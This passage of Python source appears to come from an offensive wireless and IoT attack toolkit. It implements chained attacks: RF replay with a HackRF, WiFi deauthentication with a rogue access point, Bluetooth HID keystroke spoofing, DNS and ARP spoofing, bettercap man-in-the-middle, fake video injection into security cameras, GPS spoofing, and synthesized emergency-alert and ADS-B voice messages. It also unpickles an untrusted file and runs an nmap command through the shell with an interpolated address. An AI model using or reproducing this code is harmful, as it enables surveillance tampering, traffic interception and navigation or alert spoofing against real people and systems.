            check=True
        )
        proc = subprocess.Popen(
            ["hackrf_transfer", "-t", pcapng_file, "-f", str(target_freq), "-s", "2e6", "-x", "50"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        self.process_manager.set_hackrf_process(proc, f"replay_amplify_{target_freq/1e6}MHz", "replay_amplify")
        threading.Timer(duration/2, self.process_manager.stop_hackrf_process).start()
        self.attack_log.append(f"[REPLAY AMPLIFY] Replaying {target_freq/1e6} MHz from {pcapng_file}")
        return True

    ### Chaining Attacks

    def chain_camera_jam_and_rtp_inject(self, bssid: str, camera_ip: str, video_path: str, ui) -> bool:
        """Chain camera jam and RTP inject."""
        success1 = self.execute('camera_jam', bssid)
        time.sleep(2)
        success2 = self.execute('rtp_inject', camera_ip, video_path, ui)
        return success1 and success2

    def chain_wifi_deauth_and_rogue_ap(self, target_mac: str, bssid: str, ssid: str, password: str = None) -> bool:
        """Chain WiFi deauth and rogue AP."""
        success1 = self.execute('wifi_deauth', target_mac, bssid)
        time.sleep(2)
        success2 = self.execute('rogue_ap', ssid, password)
        return success1 and success2

    def chain_ble_disrupt_and_hid_spoof(self, target_mac: str) -> bool:
        """Chain BLE disrupt and HID spoof."""
        success1 = self.execute('ble_disrupt')
        time.sleep(2)
        success2 = self.execute('bluetooth_hid_spoof', target_mac)
        return success1 and success2

    def chain_hybrid_deauth_and_dns_spoof(self, target_mac: str, bssid: str, target_ip: str, redirect_ip: str) -> bool:
        """Chain hybrid deauth and DNS spoof."""
        success1 = self.execute('hybrid_deauth', target_mac, bssid)
        time.sleep(3)
        success2 = self.execute('dns_spoof', target_ip, redirect_ip)
        return success1 and success2

    ### New Feature Methods

    def _passive_camera_enum(self, ui, duration: int = 60) -> bool:
        """Passively enumerate cameras via WPS, mDNS, and SSDP."""
        def sniff_callback(pkt):
            if pkt.haslayer(scapy.DNS) and 'mDNS' in pkt.summary():
                mac = pkt[scapy.Ether].src
                if is_camera_mac(mac):
                    with detected_cameras_lock:
                        detected_cameras[mac] = {"vendor": "Unknown", "traits": ["mDNS"]}
                    ui.add_camera(mac, "Unknown", "N/A", ["mDNS"])
            elif pkt.haslayer(scapy.Raw) and b"SSDP" in pkt[scapy.Raw].load:
                mac = pkt[scapy.Ether].src
                if is_camera_mac(mac):
                    with detected_cameras_lock:
                        detected_cameras[mac] = {"vendor": "Unknown", "traits": ["SSDP"]}
                    ui.add_camera(mac, "Unknown", "N/A", ["SSDP"])

        if self.simulate_mode:
            self.attack_log.append("[SIMULATE] Passive camera enumeration")
            return True
        scapy.sniff(iface=self.interface, prn=sniff_callback, timeout=duration, store=0)
        self.attack_log.append(f"[PASSIVE CAMERA ENUM] Enumerated cameras for {duration}s")
        return True

    def _fingerprint_camera(self, mac: str, ui) -> bool:
        """Fingerprint camera via payload entropy."""
        def calculate_entropy(data: bytes) -> float:
            if not data:
                return 0.0
            from math import log2
            length = len(data)
            counts = {}
            for byte in data:
                counts[byte] = counts.get(byte, 0) + 1
            return -sum((count / length) * log2(count / length) for count in counts.values())

        if mac not in detected_cameras:
            return False
        entropy = 0.0
        if not self.simulate_mode:
            packets = scapy.sniff(iface=self.interface, timeout=10, filter=f"ether src {mac}")
            if packets:
                payloads = [pkt[scapy.Raw].load for pkt in packets if scapy.Raw in pkt]
                entropy = sum(calculate_entropy(p) for p in payloads) / len(payloads) if payloads else 0.0
        self.target_priority[mac] = entropy * 10  # Higher entropy = higher priority
        ui.notify(f"[yellow]Fingerprint for {mac}: Entropy {entropy:.2f}[/]")
        self.attack_log.append(f"[FINGERPRINT CAMERA] {mac} entropy: {entropy:.2f}")
        return True

    def _cve_scan(self, mac: str, ui) -> bool:
        """Scan for CVEs using external API."""
        load_requests()
        if not REQUESTS_AVAILABLE:
            log_message("[ERROR] requests not available. Install with: pip install requests", ui=ui)
            return False
        if mac not in detected_cameras:
            return False
        vendor = detected_cameras.get(mac, {}).get("vendor", "Unknown")
        try:
            response = requests.get(f"https://cve.circl.lu/api/search/{vendor}", timeout=5)
            cves = response.json()[:5]  # Top 5 CVEs
            vulnerabilities = [{"name": cve["id"], "details": cve["summary"], "severity": "High", "cvss": 8.0} for cve in cves]
            self.vuln_cache[mac] = vulnerabilities
            ui.add_vulnerability(mac, vulnerabilities)
            self.attack_log.append(f"[CVE SCAN] Found {len(cves)} CVEs for {mac}")
            return True
        except Exception as e:
            self.attack_log.append(f"[CVE SCAN] Failed for {mac}: {e}")
            return False

    def _live_shell(self, ui) -> bool:
        """Launch a live Python shell."""
        banner = "Live Python Shell - Access AttackOrchestrator as 'self'"
        code.interact(banner=banner, local={'self': self, 'ui': ui})
        self.attack_log.append("[LIVE SHELL] Shell session ended")
        return True

    def _simulate_mode(self, ui) -> bool:
        """Toggle simulation mode and generate fake data."""
        self.simulate_mode = not self.simulate_mode
        if self.simulate_mode:
            pkt = scapy.Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2="00:11:22:33:44:55", type=0, subtype=8)
            ui.add_network(pkt.addr2, "SimulatedAP", "6", -50, [])
        self.attack_log.append(f"[SIMULATE MODE] {'Enabled' if self.simulate_mode else 'Disabled'}")
        return True

    ### Helper Methods

    def scan_vulnerabilities(self, camera_mac: str, ui) -> List[Dict[str, Any]]:
        """Scan camera for vulnerabilities."""
        vuln_db_path = os.path.join(BASE_DIR, "vulnerability_db.json")
        if not os.path.exists(vuln_db_path):
            log_message(f"[ERROR] vulnerability_db.json not found at {vuln_db_path}", ui=ui)
            return []
        with open(vuln_db_path) as f:
            vuln_db = json.load(f)
        with detected_cameras_lock:
            info = detected_cameras.get(camera_mac, {})
            vendor, ip = info.get("vendor", "Unknown").lower(), info.get("ip")
        found = []
        if ip and shutil.which("nmap"):
            result = subprocess.run(f"nmap -p 1-65535 --open {ip}", shell=True, capture_output=True, text=True)
            open_ports = [line.split("/")[0] for line in result.stdout.splitlines() if "/tcp" in line and "open" in line]
            for port in open_ports:
                found.append({"name": f"Open Port {port}", "severity": "Medium", "cvss": 5.0})
        self.vuln_cache[camera_mac] = found
        vuln_summary = ", ".join([f"{v['name']} ({v['severity']})" for v in found]) if found else "None"
        log_message(f"[VULN] {camera_mac}: {vuln_summary}", ui=ui)
        return found

    def scan_bluetooth(self, ui, duration: int = 60) -> None:
        """Scan Bluetooth devices."""
        load_bluetooth()
        if not BLUETOOTH_AVAILABLE:
            log_message("[ERROR] Bluetooth module not available. Install with: pip install obscura[bluetooth]", ui=ui)
            return
        start_time = time.time()
        try:
            devices = bluetooth.discover_devices(duration=8, lookup_names=True, flush_cache=True)
            for addr, name in devices:
                if not running:
                    break
                services = bluetooth.find_service(address=addr)
                rssi = self._get_bluetooth_rssi(addr)
                device_type = self._infer_device_type(name, services)
                ui.add_bluetooth_device(addr, name, device_type, rssi, [s['name'] for s in services])
            log_message(f"[BLUETOOTH] Scan completed in {time.time() - start_time:.2f}s", ui=ui)
        except Exception as e:
            log_message(f"[BLUETOOTH ERROR] Scan failed: {e}", ui=ui)

    def _get_bluetooth_rssi(self, addr: str) -> str:
        """Get Bluetooth RSSI."""
        load_bluetooth()
        if not BLUETOOTH_AVAILABLE or not shutil.which("hcitool"):
            return "N/A"
        try:
            result = subprocess.run(["hcitool", "rssi", addr], capture_output=True, text=True, check=True)
            return result.stdout.split(":")[1].strip()
        except Exception:
            return "N/A"

    def _infer_device_type(self, name: str, services: List[Dict[str, Any]]) -> str:
        """Infer Bluetooth device type."""
        name = name.lower()
        if "headset" in name or any("audio" in s['name'].lower() for s in services):
            return "Headset"
        elif "keyboard" in name or "mouse" in name:
            return "Input Device"
        elif "camera" in name or "webcam" in name:
            return "Camera"
        return "Unknown"

    def detect_threats(self, ui) -> None:
        """Detect threats using AI."""
        model_path = os.path.join(BASE_DIR, "threat_model.pkl")
        if not os.path.exists(model_path):
            log_message(f"[ERROR] threat_model.pkl not found at {model_path}", ui=ui)
            return
        with open(model_path, 'rb') as f:
            model = pickle.load(f)
        with detected_cameras_lock:
            for mac, info in detected_cameras.items():
                features = self._extract_features(info)
                if model.predict([features])[0] == 1:
                    ui.notify(f"[red]Threat detected: {mac}[/]")

    def _extract_features(self, info: Dict[str, Any]) -> List[Any]:
        """Extract features for threat detection."""
        return [
            info.get("score", 0),
            1 if "mDNS" in info.get("traits", []) else 0,
            int(info.get("signal", -100)),
            len(info.get("traits", []))
        ]

    def start_rtp_injection(self, camera_ip: str, video_path: str, ui) -> Optional[subprocess.Popen]:
        """Start RTP injection."""
        if not shutil.which("ffmpeg") or not os.path.isfile(video_path):
            return None
        proc = subprocess.Popen(
            ["ffmpeg", "-re", "-i", video_path, "-c:v", "libx264", "-f", "rtp", f"rtp://{camera_ip}:1234"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        return proc

    def bluetooth_hid_spoof(self, target_mac: str) -> None:
        """Spoof HID device."""
        load_bluetooth()
        if not BLUETOOTH_AVAILABLE:
            log_message("[ERROR] Bluetooth module not available. Install with: pip install obscura[bluetooth]", ui=None)
            return
        try:
            subprocess.run(["hcitool", "-i", "hci0", "cc", target_mac], check=True)
            if shutil.which("hid-gadget-test"):
                macro = "KEY_LEFTCTRL + KEY_T"
                subprocess.run(f"echo '{macro}' | hid-gadget-test /dev/hidg0", shell=True, check=True)
        except Exception as e:
            log_message(f"[ERROR] HID spoofing failed: {e}")

    def generate_eas_alert(self, message: str, lang: str = 'en') -> None:
        """Generate EAS alert audio."""
        load_gtts()
        load_soundfile()
        if not GTTS_AVAILABLE or not SOUNDFILE_AVAILABLE:
            log_message("[ERROR] gTTS or soundfile not available. Install with: pip install gtts soundfile", ui=None)
            return
        tts = gtts(text=message, lang=lang)
        tts.save("eas_alert.mp3")
        data, samplerate = soundfile.read("eas_alert.mp3")
        soundfile.write("eas_alert.wav", data, samplerate)

    def adsb_voice_alert(self, callsign: str, lat: float, lon: float, message: str) -> None:
        """Simulate ADS-B voice alert."""
        load_gtts()
        if not GTTS_AVAILABLE:
            log_message("[ERROR] gTTS not available. Install with: pip install gtts", ui=None)
            return
        audio = f"Attention {callsign}, at coordinates {lat}, {lon}, {message}"
        tts = gtts(text=audio)
        tts.save("adsb_alert.mp3")

    def gps_spoof_sdr(self, latitude: float, longitude: float, ui, altitude: float = 10.0) -> bool:
        """Spoof GPS with SDR."""
        if not shutil.which("gps-sdr-sim"):
            return False
        proc = subprocess.Popen(
            ["gps-sdr-sim", "-e", "brdc3540.15n", "-l", f"{latitude},{longitude},{altitude}"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        self.process_manager.add_attack_process(proc, f"gps_spoof_{latitude}_{longitude}", "gps_spoof")
        return True

    def start_mjpeg_injection(self, source_path: str, ui, port: int = 8080) -> bool:
        """Start MJPEG injection server."""
        load_cv2()
        load_flask()
        if not CV2_AVAILABLE or not FLASK_AVAILABLE:
            log_message("[ERROR] OpenCV or Flask not available. Install with: pip install opencv-python flask", ui=ui)
            return False
        if not os.path.isfile(source_path):
            return False
        app = Flask(__name__)

        @app.route('/video_feed')
        def video_feed():
            frame = cv2.imread(source_path)
            _, buffer = cv2.imencode('.jpg', frame)
            return Response(b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n',
                            mimetype='multipart/x-mixed-replace; boundary=frame')

        threading.Thread(target=app.run, args=('0.0.0.0', port), daemon=True).start()
        return True

    def start_rtsp_injection(self, camera_ip: str, victim_ip: str, fake_video_path: str, ui) -> Tuple[Optional[subprocess.Popen], Optional[subprocess.Popen]]:
        """Start RTSP injection with ARP spoofing."""
        if not shutil.which("ffmpeg") or not shutil.which("arpspoof"):
            return None, None
        ffmpeg_proc = subprocess.Popen(
            ["ffmpeg", "-re", "-i", fake_video_path, "-f", "rtsp", f"rtsp://{camera_ip}:8554/live.sdp"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        arpspoof_proc = subprocess.Popen(
            ["arpspoof", "-i", self.interface, "-t", victim_ip, camera_ip],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        return ffmpeg_proc, arpspoof_proc

    def start_bettercap_mitm(self, victim_ip: str, camera_ip: str, ui) -> Optional[subprocess.Popen]:
        """Start Bettercap MitM."""
        if not shutil.which("bettercap"):
            return None
        proc = subprocess.Popen(
            ["bettercap", "-iface", self.interface, "-caplet", "http-ui", "-eval", f"arp.spoof.targets {victim_ip},{camera_ip}; set arp.spoof on"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        return proc

    def start_auto_cleanup(self) -> None:
        """Periodically clean up inactive devices."""
        def cleanup():
            while running:
                with detected_cameras_lock:
                    inactive = [mac for mac, info in detected_cameras.items() if time.time() - info.get("last_seen", 0) > 300]
                    for mac in inactive:
                        del detected_cameras[mac]
                        self.attack_log.append(f"[AUTO CLEANUP] Removed inactive camera {mac}")
                time.sleep(60)
        threading.Thread(target=cleanup, daemon=True).start()
